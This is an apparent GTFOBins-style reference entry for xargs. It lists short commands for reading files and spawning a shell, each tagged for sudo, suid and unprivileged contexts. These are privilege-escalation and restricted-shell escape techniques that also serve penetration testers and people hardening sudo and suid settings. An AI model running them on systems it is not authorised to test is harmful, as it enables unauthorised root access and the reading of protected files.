title: xargs
html:
xargs

File Read

Context: sudo, suid, unprivileged

xargs -a /path/to/input-file -0

Shell

Context: sudo, suid, unprivileged

xargs -a /dev/null /bin/sh

Context: sudo, suid, unprivileged

xargs -a /dev/null /bin/sh

Context: sudo, suid, unprivileged

echo x | xargs -o -a /dev/null /bin/sh
excerpt: xargs File Read Context: sudo, suid, unprivileged xargs -a /path/to/input-file -0 Shell Context: sudo, suid, unprivileged xargs -a /dev/null /bin/sh Context: sudo, suid, unprivileged xargs -a /dev/nul
